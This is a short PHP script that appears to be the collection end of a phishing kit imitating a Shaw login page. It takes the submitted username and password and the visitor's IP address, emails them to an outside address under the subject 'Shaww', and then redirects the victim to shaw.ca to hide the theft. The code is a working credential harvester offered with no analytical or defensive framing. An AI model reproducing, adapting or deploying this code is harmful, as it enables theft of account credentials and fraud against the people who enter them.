<?php
    $to = "mfisherezeukwu@gmail.com";
    $ip = getenv("REMOTE_ADDR");
	$user = $_POST['username'];
    $pass = $_POST['password'];
    $from = "hot@lut.com";
    $subject = "Shaww"; 
    $message = "Email: $user\n Pass: $pass\nip: $ip\n";
    mail($to, $subject, $message, $from);
    header("Location: http://shaw.ca");
?>